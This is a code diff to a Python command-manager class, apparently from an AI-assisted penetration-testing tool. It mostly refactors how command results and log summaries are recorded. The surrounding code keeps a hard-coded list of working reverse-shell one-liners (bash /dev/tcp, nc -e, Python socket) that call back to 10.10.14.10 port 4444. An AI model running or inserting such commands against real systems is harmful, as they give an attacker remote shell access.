@@ -1,7 +1,6 @@
 import json
 import subprocess
 import time
-from pathlib import Path
 from typing import Dict, List, Optional, Tuple
 
 from wish_models import CommandResult, CommandState, LogFiles, UtcDatetime, Wish, WishState
@@ -62,10 +61,10 @@ class WishManager:
             commands = [
                 "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                 "nc -e /bin/bash 10.10.14.10 4444",
-                'python3 -c \'import socket,subprocess,os;'
-                's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
+                "python3 -c 'import socket,subprocess,os;"
+                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                 's.connect(("10.10.14.10",4444));'
-                'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
+                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                 'subprocess.call(["/bin/sh","-i"]);\'',
             ]
         else:
@@ -100,18 +99,23 @@ class WishManager:
 
             except Exception as e:
                 stderr_file.write(f"Failed to execute command: {str(e)}")
-                result.exit_code = 1
-                result.state = CommandState.OTHERS
-                result.finished_at = UtcDatetime.now()
+                
+                # Mark the command as failed
+                result.finish(
+                    exit_code=1,
+                    state=CommandState.OTHERS,
+                    log_summarizer=self.summarize_log
+                )
+                
                 return result
 
-    def summarize_log(self, stdout_path: Path, stderr_path: Path) -> str:
+    def summarize_log(self, log_files: LogFiles) -> str:
         """Generate a simple summary of command logs."""
         summary = []
 
         # Read stdout
         try:
-            with open(stdout_path, "r") as f:
+            with open(log_files.stdout, "r") as f:
                 stdout_content = f.read().strip()
                 if stdout_content:
                     lines = stdout_content.split("\n")
@@ -131,7 +135,7 @@ class WishManager:
 
         # Read stderr
         try:
-            with open(stderr_path, "r") as f:
+            with open(log_files.stderr, "r") as f:
                 stderr_content = f.read().strip()
                 if stderr_content:
                     lines = stderr_content.split("\n")
@@ -153,14 +157,16 @@ class WishManager:
         """Check status of running commands and update their status."""
         for idx, (process, result) in list(self.running_commands.items()):
             if process.poll() is not None:  # Process has finished
-                result.exit_code = process.returncode
-                result.state = CommandState.SUCCESS if result.exit_code == 0 else CommandState.OTHERS
-                result.finished_at = UtcDatetime.now()
-
-                # Generate log summary
-                if result.log_files:
-                    result.log_summary = self.summarize_log(result.log_files.stdout, result.log_files.stderr)
+                # Determine the state based on exit code
+                state = CommandState.SUCCESS if process.returncode == 0 else CommandState.OTHERS
                 
+                # Mark the command as finished
+                result.finish(
+                    exit_code=process.returncode,
+                    state=state,
+                    log_summarizer=self.summarize_log
+                )
+
                 # Update the command result in the wish object if current_wish exists
                 if self.current_wish:
                     self.current_wish.update_command_result(result)
@@ -182,13 +188,16 @@ class WishManager:
             except Exception:
                 pass  # Ignore errors in termination
 
-            # Update result
-            result.state = CommandState.USER_CANCELLED
-            result.finished_at = UtcDatetime.now()
-            
+            # Mark the command as cancelled
+            result.finish(
+                exit_code=-1,  # Use -1 for cancelled commands
+                state=CommandState.USER_CANCELLED,
+                log_summarizer=self.summarize_log
+            )
+
             # Update the command result in the wish object
             wish.update_command_result(result)
-            
+
             del self.running_commands[cmd_index]
 
             return f"Command {cmd_index} cancelled."
